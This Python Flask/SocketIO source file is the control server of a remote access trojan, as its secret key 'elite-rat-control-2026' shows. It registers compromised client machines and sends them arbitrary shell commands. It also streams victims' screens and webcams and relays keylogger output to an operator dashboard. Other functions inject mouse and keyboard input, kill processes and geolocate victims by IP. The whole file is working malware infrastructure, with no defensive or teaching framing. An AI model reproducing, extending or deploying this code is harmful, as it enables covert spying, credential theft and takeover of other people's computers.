from flask import Flask, render_template, request, jsonify, Response, send_from_directory
from flask_socketio import SocketIO, emit, join_room, leave_room
import base64
import os
import json
import time
from datetime import datetime
import threading
from collections import defaultdict

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = 'elite-rat-control-2026'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Storage
clients = {}
client_commands = defaultdict(list)
client_files = defaultdict(list)
dashboard_sids = set()

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/clients')
def api_clients():
    return jsonify({
        'clients': [
            {
                'id': cid,
                'status': clients.get(cid, {}).get('status', 'offline'),
                'ip': clients.get(cid, {}).get('ip', 'unknown'),
                'os': clients.get(cid, {}).get('os', 'unknown'),
                'hostname': clients.get(cid, {}).get('hostname', 'unknown'),
                'last_seen': clients.get(cid, {}).get('last_seen', 'never'),
                'location': clients.get(cid, {}).get('location', {})
            }
            for cid in clients.keys()
        ]
    })

@app.route('/api/clients/<client_id>/location')
def get_location(client_id):
    if client_id in clients:
        ip = clients[client_id]['ip']
        if ip == '127.0.0.1': return jsonify({'city': 'Localhost', 'country': 'Internal'})
        try:
            import requests
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = r.json()
            clients[client_id]['location'] = data
            return jsonify(data)
        except: pass
    return jsonify({'error': 'failed'})

@app.route('/api/clients/<client_id>/cmd', methods=['POST'])
def send_cmd(client_id):
    cmd = request.json.get('cmd', '')
    if client_id in clients:
        cmd_entry = {'cmd': cmd, 'id': len(client_commands[client_id])}
        client_commands[client_id].append(cmd_entry)
        # Forward command to the client via socketio
        socketio.emit('run_command', {'cmd': cmd, 'id': cmd_entry['id']}, room=client_id)
        return jsonify({'status': 'sent'})
    return jsonify({'error': 'offline'}), 404

# SocketIO Events
@socketio.on('connect')
def handle_connect():
    print('Client connected:', request.sid)

@socketio.on('dashboard_join')
def handle_dashboard_join():
    """Dashboard browsers join to receive broadcast updates."""
    dashboard_sids.add(request.sid)
    join_room('dashboard')
    # Send current client list
    client_list = []
    for cid, cdata in clients.items():
        client_list.append({
            'id': cid,
            'status': cdata.get('status', 'offline'),
            'ip': cdata.get('ip', 'unknown'),
            'os': cdata.get('os', 'unknown'),
            'hostname': cdata.get('hostname', 'unknown'),
            'last_seen': cdata.get('last_seen', 'never')
        })
    emit('clients_update', {'clients': client_list})
    print(f"Dashboard joined: {request.sid}")

@socketio.on('get_clients')
def handle_get_clients():
    """Return current client list to requesting dashboard."""
    client_list = []
    for cid, cdata in clients.items():
        client_list.append({
            'id': cid,
            'status': cdata.get('status', 'offline'),
            'ip': cdata.get('ip', 'unknown'),
            'os': cdata.get('os', 'unknown'),
            'hostname': cdata.get('hostname', 'unknown'),
            'last_seen': cdata.get('last_seen', 'never')
        })
    emit('clients_update', {'clients': client_list})

def broadcast_clients():
    """Broadcast updated client list to all dashboards."""
    client_list = []
    for cid, cdata in clients.items():
        client_list.append({
            'id': cid,
            'status': cdata.get('status', 'offline'),
            'ip': cdata.get('ip', 'unknown'),
            'os': cdata.get('os', 'unknown'),
            'hostname': cdata.get('hostname', 'unknown'),
            'last_seen': cdata.get('last_seen', 'never')
        })
    socketio.emit('clients_update', {'clients': client_list}, room='dashboard')

@socketio.on('register_client')
def register_client(data):
    client_id = data['client_id']
    clients[client_id] = {
        'sid': request.sid,
        'status': 'online',
        'ip': request.remote_addr,
        'os': data.get('os', 'unknown'),
        'hostname': data.get('hostname', 'unknown'),
        'last_seen': datetime.now().isoformat(),
        'screen': None,
        'webcam': None
    }
    join_room(client_id)
    broadcast_clients()
    print(f"New client registered: {client_id}")

@socketio.on('heartbeat')
def heartbeat(data):
    client_id = data['client_id']
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.now().isoformat()
        clients[client_id]['status'] = 'online'

        # Send pending commands
        if client_commands[client_id]:
            emit('pending_commands', client_commands[client_id][-1:], room=client_id)

@socketio.on('screen_data')
def screen_data(data):
    client_id = data['client_id']
    if client_id in clients:
        clients[client_id]['screen'] = data['image']
        # Forward to dashboards for live view
        socketio.emit('screen_frame', {
            'client_id': client_id,
            'image': data['image']
        }, room='dashboard')

@socketio.on('webcam_data')
def webcam_data(data):
    client_id = data['client_id']
    if client_id in clients:
        clients[client_id]['webcam'] = data['image']
        socketio.emit('webcam_frame', {
            'client_id': client_id,
            'image': data['image']
        }, room='dashboard')

@socketio.on('cmd_result')
def cmd_result(data):
    client_id = data['client_id']
    result_id = data.get('result_id')
    if result_id is not None and client_id in client_commands and len(client_commands[client_id]) > result_id:
        client_commands[client_id][result_id]['result'] = data.get('output', '')
    # Broadcast to dashboards
    socketio.emit('cmd_output', {
        'client_id': client_id,
        'output': data.get('output', '')
    }, room='dashboard')

@socketio.on('keys_data')
def keys_data(data):
    client_id = data['client_id']
    socketio.emit('keys_update', {
        'client_id': client_id,
        'keys': data.get('keys', '')
    }, room='dashboard')

@socketio.on('toggle_stream')
def handle_toggle_stream(data):
    """Forward stream toggle to the target client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('toggle_stream', data, room=client_id)

@socketio.on('get_processes')
def handle_get_processes(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('get_processes', data, room=client_id)

@socketio.on('kill_process')
def handle_kill_process(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('kill_process', data, room=client_id)

# --- Remote Input Forwarding ---
@socketio.on('mouse_move')
def handle_mouse_move(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('mouse_move', data, room=client_id)

@socketio.on('mouse_click')
def handle_mouse_click(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('mouse_click', data, room=client_id)

@socketio.on('key_press')
def handle_key_press(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('key_press', data, room=client_id)

@socketio.on('scroll')
def handle_scroll(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('scroll', data, room=client_id)

@socketio.on('disconnect')
def handle_disconnect():
    # Remove from dashboard set
    dashboard_sids.discard(request.sid)
    # Check if it was a client
    for client_id, client_data in list(clients.items()):
        if client_data['sid'] == request.sid:
            clients[client_id]['status'] = 'offline'
            broadcast_clients()
            break

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    socketio.run(app, host='0.0.0.0', port=port, debug=False)